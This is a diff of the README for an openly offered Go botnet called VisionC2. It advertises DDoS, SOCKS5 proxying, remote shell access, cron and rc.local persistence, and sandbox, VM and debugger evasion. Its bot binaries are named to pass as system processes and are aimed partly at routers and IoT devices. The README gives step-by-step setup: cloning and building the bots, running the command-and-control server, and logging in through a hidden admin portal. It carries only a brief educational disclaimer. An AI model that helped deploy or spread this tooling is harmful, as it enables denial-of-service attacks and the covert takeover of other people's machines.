@@ -1,7 +1,7 @@
 
 <div align="center">
 
-# ☾℣☽ision - **Advanced Go-Based Botnet**  
+# ☾℣☽ision - **Advanced Go-Based Botnet**
 
 **DDoS • SOCKS5 Proxying • Remote Shell • Multi-Architecture • TUI View**
 
@@ -14,6 +14,7 @@
 ![Animation](https://github.com/user-attachments/assets/4475a3a1-b3a5-4bb3-b00a-b30e88210dcd)
 
 ---
+
 ## ✨ Features
 
 ### Bot Capabilities
@@ -35,95 +36,132 @@
 - **HMAC challenge-response** authentication system
 - **Multi-layer obfuscation** — RC4 → XOR → byte substitution → MD5
 - **Anti-analysis & evasion** — **Sandbox detection** • **VM detection** • **Debugger detection**
+
 ---
+
 ## 🚀 Quick Start
 
-### Prerequisites
+### 📋 Prerequisites
+
+#### **System Requirements**
+- **Operating System**: Linux (recommended), macOS, or Windows (WSL2)
+- **Memory**: 2GB+ RAM (4GB+ recommended)
+- **Hosting**: 1 VPS + 1 Registered Domain(optional) (for C2 server)
+
+#### **Package Installation**
+
+**Ubuntu/Debian:**
 ```bash
-sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen
-# Go 1.23+ → https://go.dev/dl/
+sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen build-essential
 ```
 
-### Installation
+**CentOS/RHEL/Fedora:**
 ```bash
-git clone https://github.com/Syn2Much/VisionC2.git
-
-cd VisionC2
-chmod +x *
-
-python3 setup.py
-# CNC will be built as ./server in ./VisionC2 root directory. Binaries will be built to ./VisionC2/bins
+sudo yum install -y upx openssl git wget gcc python3 screen make
+# or for newer Fedora:
+sudo dnf install -y upx openssl git wget gcc python3 screen make
 ```
-
-## ⚙️ Configuration
-
-Code changes are made automatically via an interactive setup 
-
-Review `setup_config.txt` after running to see current:
-* C2 address & ports
-* Magic code & encryption keys
-* Generated 4096-bit TLS certificates
 
 ---
 
+## ⚙️ Installation & Setup
 
-### Running the C2
-**Recommended (TUI Mode)**
+### **Step 1: Clone Repository**
 ```bash
+git clone https://github.com/Syn2Much/VisionC2.git
+cd VisionC2
+chmod +x *
+```
+
+### **Step 2: Run Interactive Setup**
+```bash
+python3 setup.py
+```
+
+The setup script will:
+1. Generate 4096-bit TLS certificates
+2. Create encryption keys and magic codes
+3. Configure C2 address and ports
+4. Cross-compile bot binaries for all architectures
+5. Build the CNC server binary
+
+**Output Locations:**
+- CNC Server: `./server` (in VisionC2 root directory)
+- Bot Binaries: `./VisionC2/bins/`
+- Configuration: `setup_config.txt`
+
+---
+
+## 📁 File Structure
+
+```
+VisionC2/
+├── server                  # Compiled CNC server
+├── setup.py               # Interactive setup script
+├── setup_config.txt       # Generated configuration
+├── users.json            # User database (Telnet mode)
+├── cnc/certificates/                # TLS certificates
+│   ├── server.crt
+│   └── server.key
+├── bins/                 # Compiled bot binaries
+│   ├── kworkerd0        # x86 Linux
+│   ├── ethd0           # x86_64 Linux
+│   ├── mdsync1         # ARMv7
+│   └── ...
+├── bot/                  # Bot source code
+│   ├── main.go
+│   ├── attacks.go
+│   └── ...
+└── Docs/                 # Documentation
+    ├── USAGE.md
+    ├── COMMANDS.md
+    └── CHANGELOG.md
+```
+---
+
+## 🖥️ Running the C2 Server
+
+### **Option 1: TUI Mode (Recommended)**
+```bash
+# Start in screen session for persistence
 screen ./server
-# Press Ctrl+A then D to detach from screen session
-# Reattach with: screen -r
+
+# Detach from screen session: Ctrl+A, then D
+# Reattach: screen -r 
 ```
 
-**Telnet/Multi-User Mode (Legacy)**
+### **Option 2: Telnet/Multi-User Mode**
 ```bash
+# Start with split admin interface
 screen ./server --split
-# Then connect with: nc <c2-ip> <admin-port>
-# Type "spamtec" to trigger hidden login portal
-# Uses users.json database for authentication
 
-# Detach from screen: Ctrl+A then D
-# Reattach: screen -r
+# Connect to admin interface
+nc your-server-ip 1337
+# Login with "spamtec" to access hidden portal
 ```
+
 [COMMANDS.md](Docs/COMMANDS.md) | **Complete CNC command reference**  
 
 Bot binaries are automatically cross-compiled to `bot/bins/`.
 
+---
+## 🧬 Supported Architectures
 
-## 🧬 Supported Architectures & Stealth Binaries
+| Binary Name | Architecture | Target Platforms | Size (approx) |
+|-------------|--------------|------------------|---------------|
+| `kworkerd0` | x86 (386)    | Linux 32-bit, legacy systems | 2.1 MB |
+| `ethd0`     | x86_64       | Linux 64-bit (most servers) | 2.3 MB |
+| `mdsync1`   | ARMv7        | Raspberry Pi 2/3, older ARM devices | 2.0 MB |
+| `ip6addrd`  | ARM64        | Raspberry Pi 4, Android, AWS Graviton | 2.2 MB |
+| `httpd`     | MIPS         | Routers, IoT devices | 2.4 MB |
+| `+12 more`  | PPC64, RISC-V, s390x, loong64, etc. | Various embedded systems | 1.8-2.5 MB |
 
-| Binary Name   | Architecture | Target Platforms                     |
-|---------------|--------------|--------------------------------------|
-| `kworkerd0`   | x86 (386)    | Linux 32-bit                         |
-| `ethd0`       | x86_64       | Linux 64-bit (most common)           |
-| `mdsync1`     | ARMv7        | Raspberry Pi 2/3, older ARM devices  |
-| `ip6addrd`    | ARM64        | Raspberry Pi 4, modern Android, AWS Graviton |
-| `httpd`       | MIPS         | Routers, IoT devices                 |
-| `...`         | +12 more     | PPC64, RISC-V, s390x, loong64, etc.  |
-
-All binaries are UPX-packed, stripped, and named to blend with legitimate system processes.
-
-## Architecture Overview
-
-```
-[ Admin ] → [ C2 Server/TUI ] ↔ [ Bot Agents ]
-                    │              │
-            TLS 1.3 │              ├─ Persistence (cron/rc.local)
-            HMAC Auth │            ├─ Multi-layer C2 Resolution
-                    │              ├─ Sandbox Detection
-                    │              └─ Encrypted Command Loop
-                    │
-                    └─ Issues HMAC challenge
-                       Verifies response
-                       Queues commands
-```
-
-**Authentication Flow**
-1. Bot decrypts embedded C2 config (Base64 → XOR → RC4 → Byte Sub → MD5)
-2. Resolves C2 via DoH TXT / DNS A records
-3. TLS 1.3 handshake → HMAC challenge → MD5(ch + MAGIC + ch)
-4. Successful auth → encrypted command loop
-
+**Stealth Features:**
+- All binaries UPX-packed and stripped
+- Legitimate-sounding process names
+- No external dependencies (statically linked)
+- Small memory footprint
+---
 ## 📜 Documentation
 
 | File                    | Description                                      |
@@ -153,9 +191,4 @@ This software is provided strictly for educational, research, and authorized pen
 ## 📜 License
 GNU General Public License v3.0 — see [LICENSE](LICENSE)
 
-## Support
-- Open a GitHub Issue for bugs or feature requests
-- Detailed documentation in `USAGE.md`
-- Contact: `dev@sinners.city`
-
----
+<div align="center"> <sub>Maintained with ❤️ by the Syn</sub> </div> 
